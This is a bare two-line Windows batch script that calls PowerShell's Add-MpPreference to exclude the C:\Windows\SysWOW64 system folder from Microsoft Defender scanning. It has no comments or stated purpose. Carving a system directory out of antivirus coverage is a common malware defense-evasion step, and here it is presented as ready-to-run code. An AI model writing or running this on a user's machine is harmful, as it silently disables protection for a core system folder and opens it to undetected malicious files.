@echo off
start /wait powershell Add-MpPreference -ExclusionPath "C:\Windows\SysWOW64"
